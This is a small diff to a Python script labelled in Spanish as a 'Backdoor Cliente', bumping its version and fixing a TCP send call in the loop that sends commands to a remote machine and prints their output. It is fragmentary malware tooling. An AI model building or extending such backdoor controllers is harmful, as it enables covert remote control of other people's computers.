@@ -1,7 +1,7 @@
 """
 Uso: Backdoor Cliente
 Creado: Andrés Hernández Mata
-Version: 2.0.0
+Version: 2.0.1
 Python: 3.9.1
 Fecha: 08 Abril 2020
 """
@@ -33,7 +33,7 @@ while True:
         os.system("cls")
         print("[+] Enviando Comando...")
         comando = comando.encode()        
-        TCPClientSocket.sendto(comando, servidor)        
+        TCPClientSocket.send(comando)
         salida = TCPClientSocket.recv(bufferSize)
         print("[+] Espere...")        
         salida = salida.decode()
